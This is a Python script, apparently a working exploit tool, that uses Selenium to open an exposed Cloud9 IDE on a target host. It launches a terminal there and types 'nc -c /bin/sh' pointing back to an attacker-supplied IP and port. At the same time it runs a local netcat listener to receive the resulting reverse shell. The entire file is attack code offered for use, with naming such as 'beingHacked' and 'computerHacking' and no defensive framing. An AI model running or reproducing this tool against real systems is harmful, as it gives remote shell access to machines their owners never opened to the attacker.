#!/usr/bin/python
from selenium import webdriver
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
from subprocess import call
import threading
import sys
import getopt

def main(argv):
    receivePort = None
    c9Port = None
    try:
        opts, args = getopt.getopt(argv, "hc:r:p:l:", ['c9-port=','recieve-port=','help','recieve-ip=','c9-ip='])
    except getopt.GetoptError:
        print("cloud9_expnpay -c <IPv4 running cloud 9> -r <IPv4 location to recieve>")
        print("Use -h or --help for help")
        sys.exit(0)
    for opt, arg in opts:
        if opt in ('-h','--help'):
            print("Use -c or --ip-to-hack to input the IPv4 of the computer running C9")
            print("Use -r or --recieve-ip to input the IPv4 of the computer that will listen for shell")
            print("Use -p or --c9-port to input the port that is running C9")
            print("Use -l or --recieve-port to input the port to listen for the shell on")
            sys.exit(0)
        elif opt in ('-c', '--ip-to-hack'):
            hasPort = arg.find(':')
            if hasPort != -1 :
                portAndIP = arg.split(':')
                c9Port = portAndIP[1]
                beingHacked = portAndIP[0]
            else:
                beingHacked = arg
        elif opt in ('-r','--recieve-ip'):
            hasPort = arg.find(':')
            if hasPort != -1 :
                portAndIP2 = arg.split(':')
                receivePort = portAndIP2[1]
                computerHacking = portAndIP2[0]
            else:
                computerHacking = arg
        elif opt in ('-p', '--c9port'):
            c9Port = arg
        elif opt in ('-l', '--recieve-port'):
            recievePort = arg
        else:
            print("You typed something wrong")
            print("Use -h or --help for help")
            sys.exit(0)

    if len(opts) == 0:
        print("You need to type in arguments")
        print("Use -h or --help for help")
        sys.exit(0)
    return (receivePort, c9Port, beingHacked, computerHacking)

def reverseHacker(recievePort):
    call(["nc", "-l", "-p", receivePort, "-vvv"])

def shellHack(recievePort, c9Port, beingHacked, computerHacking):
    browser = webdriver.Firefox()
    url = 'http://' + beingHacked + ':' + c9Port + '/ide.html'
    browser.get(url)
    try:
        element = WebDriverWait(browser, 60).until(
            EC.presence_of_element_located((By.CLASS_NAME,'plus_tab_button'))
        )
    finally:
        plus_btn = browser.find_element_by_class_name("plus_tab_button")
        browser.implicitly_wait(60)
        ActionChains(browser).click(plus_btn).perform()
        browser.implicitly_wait(30)
        newT = browser.find_element_by_xpath("//*[text()='New Terminal']")
        ActionChains(browser).move_to_element(newT).click().perform()
        term = browser.find_element_by_class_name("ace_content")
        ActionChains(browser).click(term).perform()
        browser.implicitly_wait(600)
        time.sleep(10)
        ta = browser.find_element_by_class_name('ace_text-input')
        ActionChains(browser).send_keys("nc -c /bin/sh "+ computerHacking + " "+recievePort + " \n").perform()
        browser.implicitly_wait(10)
        time.sleep(10)
        browser.quit()


def prog(receivePort, c9Port, beingHacked, computerHacking):
    thread1.start()
    thread2.start()
    thread1.join()
    thread2.join()
    
if __name__ == '__main__':
    receivePort = "4445"
    c9Port = "3000"
    beingHacked = ''
    computerHacking = ''
    returnedVal = main(sys.argv[1:])
    if returnedVal[0] != '' and returnedVal[0] != None:
	receivePort = returnedVal[0]
    if returnedVal[1] != '' and returnedVal[1] != None:
        c9Port = returnedVal[1]
    beingHacked = returnedVal[2]
    computerHacking = returnedVal[3]
    thread1 = threading.Thread(target = shellHack, args = (receivePort, c9Port, beingHacked, computerHacking))
    thread2 = threading.Thread(target = reverseHacker, args = (receivePort,))
    thread2.daemon = True

    try:
        prog(receivePort, c9Port, beingHacked, computerHacking)
    except KeyboardInterrupt:
        if thread1.isAlive():
	    print("\nError")
            sys.exit(0)
        else:
            print("Done")
            sys.exit(0)    
